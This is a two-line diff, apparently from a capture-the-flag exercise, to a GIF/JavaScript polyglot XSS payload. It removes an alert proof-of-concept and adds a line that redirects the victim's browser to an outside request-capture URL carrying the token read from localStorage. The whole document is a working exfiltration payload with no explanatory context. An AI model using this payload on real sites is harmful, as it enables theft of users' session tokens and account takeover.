@@ -1,1 +1,2 @@
-GIF89a/*<svg/onload=alert(1)>*/=alert(document.domain)//;
+GIF89a/*.......*/=0;
+window.location='https://envjs5kxlmfl33f.m.pipedream.net/ctf?token=='+localStorage.getItem("token");
